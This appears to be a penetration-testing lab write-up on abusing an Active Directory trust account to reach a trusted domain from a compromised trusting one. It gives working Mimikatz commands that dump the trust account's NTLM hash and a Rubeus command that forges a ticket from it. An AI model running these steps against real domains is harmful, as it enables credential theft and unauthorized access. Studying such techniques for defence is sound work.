# Abusing Trust Account$: Accessing Resources on a Trusted Domain from a Trusting Domain

This is a quick lab to familiarize with a technique that allows accessing resources on a trusted domain from a fully compromised (Domain admin privileges achieved) trusting domain, by recovering the trusting `account$` (that's present on the trusted domain) password hash.

This lab is based on the great research here [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted), go check it out for more details and detection / prevention ideas.

## Overview

The environment for this lab is as follows:

| Resource               | Type              |                                                                                      |
| ---------------------- | ----------------- | ------------------------------------------------------------------------------------ |
| first-dc.first.local   | Domain Controller | Domain controller in the first.local domain                                          |
| second-dc.second.local | Domain Controller | Domain controller in the second.local domain                                         |
| first.local            | Domain            | This domain does not trust second.local domain, but second.local trusts this domain. |
| second.local           | Domain            | This domain trusts first.local domain, but first.local does not trust this domain.   |

In short, there is a one way trust relationship between `first.local` and `second.local`, where `first.local` does not trust `second.local`, but `second.local` trusts `first.local`. Or simply put in other words, it's possible to access resources from `first.local` on `second.local`, but not the other way around.

The technique in this lab, however, shows that it's still possible to access resources from `second.local` on `first.local` domain if `second.local` domain is compromised and domain admin privileges are obtained.&#x20;

This technique is possible, because once a trust relationship between domains is established, a trust account for the trusting domain is created in the trusted domain and it's possible to compromise that account's password hash, which enables an attacker to authenticate to the trusted domain with the trust account.

In our lab, considering that `first.local` is a trusted domain trusted by the trusting domain `second.local`, the trust account `first.local\second$` (user account `second$` in the domain `first.local`) will be created.&#x20;

`first.local\second$` is the trust account we want to and CAN compromise from the `second.local domain`, assuming we have domain admin privileges there.

Visually, this looks like something like this:

![Technique / attack diagram based on the one seen in https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](<../../.gitbook/assets/image (1088).png>)

## Checks

Let's check some of the things we touched on in the overview.&#x20;

Confirm the trust relationships between domains:

```
# on first-dc.first.local
get-adtrust -filter *
```

![](<../../.gitbook/assets/image (1092).png>)

```
# on second-dc.second.local
get-adtrust -filter *
```

![](<../../.gitbook/assets/image (1089).png>)

Confirm that there's a trust account `second$` on `first.local` domain:

```
# on first-dc.first.local
get-aduser 'second$'
```

![](<../../.gitbook/assets/image (1094).png>)

Confirm that we can enumerate resources on the trusting domain `second.local` from `first.local`:

```
# from first-dc.first.local
get-aduser -Filter * -Server second.local -Properties samaccountname,serviceprincipalnames | ? {$_.ServicePrincipalNames} | ft
```

![](<../../.gitbook/assets/image (1085).png>)

Confirm that we cannot (just yet, but this is soon to change) enumerate resources on the trusted domain `first.local` from the trusting domain :

```
# on second-dc.second.local
get-aduser -Filter * -Server first.local -Properties samaccountname,serviceprincipalnames | ? {$_.ServicePrincipalNames} | ft
```

![](<../../.gitbook/assets/image (1091).png>)

## Compromising Trust Account first.local\second$

As mentioned earlier, the main crux of the technique is that we're able to compromise the trust account `first.local\second$` if we have domain admin privileges on `second.local`.

To compromise the `first.local\second$` and reveal its password hash, we can use mimikatz like so:

```
# on second-dc.second.local
mimikatz.exe "lsadump::trust /patch" "exit"
```

![](<../../.gitbook/assets/image (1093).png>)

Note the RC4 hash in `[out] first.local` -> `second.local` line - this is the NTLM hash for `first.local\second$` trust account, capture it.

## Requesting TGT for first.local\second$

Once we have the NTLM hash for `first.local\second$`, we can request its TGT from `first.local`:

```
#on second-dc.second.local
Rubeus.exe asktgt /user:second$ /domain:first.local /rc4:24b07e26ca7affb4ac061f6920cb57ec /nowrap /ptt
```

![](<../../.gitbook/assets/image (1095).png>)

## Accessing Resources on First.local from Second.local

At this point on `second-dc.second.local`, we have a TGT for `first.local\second$` committed to memory and we can now start enumerating resources on `first.local` - and this concludes the technique, showing that it's possible to access resources on a trusted domain (as a low privileged user), given the trusting domain is compromised:

```
Get-ADUser roast.user -Server first.local -Properties * | select samaccountname, serviceprincipalnames
```

![](<../../.gitbook/assets/image (1090).png>)

## References

{% embed url="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted" %}
